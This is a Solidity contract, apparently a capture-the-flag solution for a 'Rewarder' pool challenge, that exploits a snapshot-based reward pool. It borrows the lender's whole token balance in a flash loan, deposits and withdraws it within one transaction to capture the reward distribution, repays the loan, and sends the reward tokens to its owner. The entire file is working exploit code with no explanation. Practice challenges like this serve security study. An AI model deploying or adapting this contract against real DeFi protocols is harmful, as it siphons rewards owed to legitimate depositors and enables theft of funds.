pragma solidity ^0.8.0;

import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TheRewarderAttacker {
    TheRewarderPool immutable rewarderPool;
    FlashLoanerPool immutable flashLoanerPool;
    IERC20 immutable liquidityToken;
    address owner;

    constructor(address _owner, address _rewarderPool, address _flashLoanerPool, address _liquidityToken) {
        owner = _owner;
        rewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        liquidityToken = IERC20(_liquidityToken);
    }

    function attack() external {
        uint amountInPool = liquidityToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(amountInPool);

        IERC20 rewardToken = IERC20(rewarderPool.rewardToken());
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }

}
